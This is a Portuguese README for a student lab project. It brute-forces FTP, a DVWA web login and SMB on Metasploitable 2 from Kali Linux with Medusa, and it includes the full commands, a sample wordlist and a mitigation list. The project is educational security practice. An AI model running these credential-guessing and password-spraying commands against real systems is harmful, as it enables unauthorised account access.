# medusa-test-metasploitable2-vm
teste de força bruta no metasploitable2 a partir do kali com medusa

<img width="1904" height="1074" alt="projeto em execução" src="https://github.com/user-attachments/assets/6e9ada02-6daa-4d16-85c5-6a092def2234" />



<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
</head>
<body>

<h1>🔐 Projeto Prático: Testes de Força Bruta</h1>

<p>
Implementação e documentação de ataques simulados utilizando 
<strong>Kali Linux</strong> e <strong>Medusa</strong> em ambientes vulneráveis 
como <strong>Metasploitable 2</strong> e <strong>DVWA</strong>.
</p>

<hr>

<h2>📌 Objetivo</h2>
<p>
Simular cenários reais de ataque de força bruta para análise prática de vulnerabilidades
e aplicação de medidas de mitigação em serviços de autenticação.
</p>

<hr>

<h2>🧱 Estrutura do Ambiente</h2>

<h3>🔧 Ferramentas</h3>
<ul>
  <li>Kali Linux (máquina atacante)</li>
  <li>Metasploitable 2 (máquina vulnerável)</li>
  <li>DVWA (aplicação web vulnerável)</li>
  <li>VirtualBox</li>
</ul>

<h3>🌐 Rede</h3>
<ul>
  <li>Modo: <strong>Host-Only</strong></li>
  <li>Ambiente isolado</li>
  <li>Sem acesso externo</li>
</ul>

<hr>

<h2>⚙️ Cenários de Ataque</h2>

<h3>1. 🔓 Força Bruta em FTP</h3>

<p><strong>Objetivo:</strong> Descobrir credenciais válidas.</p>

<pre><code>medusa -h &lt;IP_ALVO&gt; -u msfadmin -P wordlist.txt -M ftp
</code></pre>

<p><strong>Resultado:</strong> Acesso autenticado ao serviço FTP.</p>

---

<h3>2. 🌐 Ataque a Login Web (DVWA)</h3>

<p><strong>Objetivo:</strong> Automatizar tentativas em formulário web.</p>

<pre><code>medusa -h &lt;IP_ALVO&gt; -u admin -P wordlist.txt -M http -m FORM:"/dvwa/login.php:username=^USER^&password=^PASS^:F=Login failed"
</code></pre>

---

<h3>3. 🗂️ Password Spraying em SMB</h3>

<p><strong>Objetivo:</strong> Testar uma senha em múltiplos usuários.</p>

<pre><code>medusa -h &lt;IP_ALVO&gt; -U users.txt -p senha123 -M smbnt
</code></pre>

<hr>

<h2>📄 Wordlist (Exemplo)</h2>

<pre><code>123456
password
admin
msfadmin
senha123
</code></pre>

<hr>

<h2>✅ Validação</h2>

<ul>
  <li>Identificação de credenciais válidas no output</li>
  <li>Teste manual de login</li>
  <li>Registro dos resultados</li>
</ul>

<hr>

<h2>🛡️ Mitigação</h2>

<ul>
  <li>Políticas de senha forte</li>
  <li>Bloqueio por tentativas</li>
  <li>MFA (autenticação multifator)</li>
  <li>Monitoramento de logs</li>
  <li>Desativação de serviços desnecessários</li>
</ul>

<hr>

<h2>📚 Conclusão</h2>

<p>
Ambientes sem proteção adequada são rapidamente comprometidos por ataques automatizados.
A prática demonstrou a importância de controles básicos de segurança para reduzir riscos.
</p>

<hr>

<h2>📖 Aprendizados</h2>

<ul>
  <li>Configuração de laboratório isolado</li>
  <li>Tipos de ataque: brute force, dictionary, spraying</li>
  <li>Uso prático do Medusa</li>
  <li>Exploração de FTP, SMB e HTTP</li>
  <li>Criação e uso de wordlists</li>
  <li>Validação de acessos</li>
  <li>Implementação de defesa</li>
</ul>

<hr>

<h2>⚠️ Aviso</h2>

<p>
Este projeto é exclusivamente educacional em parceria e estudos com web.dio.me . Não utilize estas técnicas sem autorização.
</p>

</body>
</html>
